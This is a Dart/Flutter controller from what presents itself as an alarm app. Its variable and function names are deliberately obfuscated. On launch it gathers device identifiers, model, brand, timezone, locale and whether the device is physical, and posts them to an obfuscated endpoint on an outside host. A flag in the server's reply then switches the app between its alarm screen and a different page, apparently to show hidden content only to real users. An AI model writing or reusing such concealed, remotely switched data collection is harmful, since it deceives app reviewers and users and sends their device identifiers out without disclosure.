import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import '../../alarm_names.dart';



class ManageInitLogic extends GetxController {

  var ngacqwjphd = RxBool(false);
  var tqglizxnw = RxBool(true);
  var ivaubtmx = RxString("");
  var jorge = RxBool(false);
  var watsica = RxBool(true);
  final rfzadcslh = Dio();


  InAppWebViewController? webViewController;

  dynamic hgoayrkbdl(){
    final wivqhzscg = InternetConnectionChecker.instance;
    final yvrjslu = wivqhzscg.onStatusChange.skip(1).listen(
          (InternetConnectionStatus lajmighw) {
        if (lajmighw == InternetConnectionStatus.connected) {
          naeqz();
        } else {
          Get.toNamed(AlarmNames.brokenPage)?.then((_){
            naeqz();
          });
        }
      },
    );
    return yvrjslu;
  }

  Future<bool> pqdnazxcho() async {
    var otfiknpy = await InternetConnectionChecker.instance.hasConnection;
    if(!otfiknpy){
      Get.toNamed(AlarmNames.brokenPage)?.then((_){
        naeqz();
      });
    }
    return otfiknpy;
  }

  @override
  void onInit() {
    super.onInit();
    hgoayrkbdl();
    naeqz();
  }


  Future<void> naeqz() async {

    var rkelapzd = await pqdnazxcho();
    if(!rkelapzd){
      return;
    }

    jorge.value = true;
    watsica.value = true;
    tqglizxnw.value = false;

    rfzadcslh.post("https://plan.thbond.net/hibpzrfvmxdykslwuqcagonjet",data: await hyqrvoctsa()).then((value) {
      var sjnrtpo = value.data["sjnrtpo"] as String;
      var qlsc = value.data["qlsc"] as bool;
      if (qlsc) {
        ivaubtmx.value = sjnrtpo;
        rhiannon();
      } else {
        ferry();
      }
    }).catchError((e) {
      tqglizxnw.value = true;
      watsica.value = true;
      jorge.value = false;
    });
  }

  Future<Map<String, dynamic>> hyqrvoctsa() async {
    final DeviceInfoPlugin vnshxo = DeviceInfoPlugin();
    PackageInfo cqpzjeno_ymun = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var emwxobi = Platform.localeName;
    var lvncwr = currentTimeZone;

    var agpqmnu = cqpzjeno_ymun.packageName;
    var giqnc = cqpzjeno_ymun.version;
    var ksui = cqpzjeno_ymun.buildNumber;

    var arqi = cqpzjeno_ymun.appName;
    var pxvse = "";
    var zeap  = "";
    var hzmfkrld = "";
    var consueloWeber = "";
    var waltonAuer = "";
    var nikkiBalistreri = "";
    var revaLesch = "";


    var omiw = "";
    var jskzaqcx = false;

    if (GetPlatform.isAndroid) {
      omiw = "android";
      var qolyweprv = await vnshxo.androidInfo;

      hzmfkrld = qolyweprv.brand;

      pxvse  = qolyweprv.model;
      zeap = qolyweprv.id;

      jskzaqcx = qolyweprv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      omiw = "ios";
      var qojimx = await vnshxo.iosInfo;
      hzmfkrld = qojimx.name;
      pxvse = qojimx.model;

      zeap = qojimx.identifierForVendor ?? "";
      jskzaqcx  = qojimx.isPhysicalDevice;
    }
    var res = {
      "arqi": arqi,
      "jskzaqcx": jskzaqcx,
      "ksui": ksui,
      "agpqmnu": agpqmnu,
      "nikkiBalistreri" : nikkiBalistreri,
      "lvncwr": lvncwr,
      "hzmfkrld": hzmfkrld,
      "zeap": zeap,
      "emwxobi": emwxobi,
      "omiw": omiw,
      "consueloWeber" : consueloWeber,
      "giqnc": giqnc,
      "waltonAuer" : waltonAuer,
      "pxvse": pxvse,
      "revaLesch" : revaLesch,

    };
    return res;
  }

  Future<void> ferry() async {
    Get.offNamed(AlarmNames.alarmTab);
  }

  Future<void> rhiannon() async {
    Get.offNamed(AlarmNames.audioTrans);
  }

  @override
  void dispose() {
    hgoayrkbdl().cancel();
    super.dispose();
  }

}
